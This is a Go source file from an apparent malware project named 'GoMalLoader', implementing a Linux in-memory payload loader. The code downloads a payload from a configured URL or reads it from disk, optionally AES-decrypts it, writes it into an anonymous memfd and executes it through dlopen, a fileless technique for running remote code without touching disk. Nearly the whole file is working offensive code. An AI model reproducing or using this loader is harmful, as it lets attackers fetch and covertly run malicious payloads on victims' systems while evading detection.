//go:build linux

package loader

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"

	"GoMalLoader/utils"
)

const SYS_memfd_create = 319 // x86_64 Linux

// TODO: Implement reflective loader using ELF parsing and in-memory loading

type linuxReflectiveLoader struct{}

func NewReflectiveLoader() ReflectiveLoader {
	return &linuxReflectiveLoader{}
}

func (l *linuxReflectiveLoader) Load(cfg LoaderConfig) error {
	var payload []byte
	var err error

	if cfg.Source == "url" {
		resp, err := http.Get(cfg.URL)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		payload, err = io.ReadAll(resp.Body)
	} else {
		payload, err = os.ReadFile(cfg.Path)
	}
	if err != nil {
		return err
	}

	if cfg.Obfuscated {
		payload, err = utils.AESDecrypt(payload, []byte(cfg.AESKey))
		if err != nil {
			return err
		}
	}

	log.Printf("[+] Creating memfd for in-memory ELF loading")
	name := []byte("reflective_elf\x00")
	fd, _, errno := syscall.Syscall(SYS_memfd_create, uintptr(unsafe.Pointer(&name[0])), 0, 0)
	if errno != 0 {
		return fmt.Errorf("memfd_create failed: %v", errno)
	}
	defer syscall.Close(int(fd))

	log.Printf("[+] Writing payload to memfd")
	if _, err := syscall.Write(int(fd), payload); err != nil {
		return fmt.Errorf("write to memfd failed: %v", err)
	}

	log.Printf("[+] Loading ELF from memfd using dlopen")
	if err := utils.DlopenFromFd(int(fd)); err != nil {
		return fmt.Errorf("dlopen failed: %v", err)
	}
	log.Printf("[+] Reflective ELF load complete.")
	return nil
}
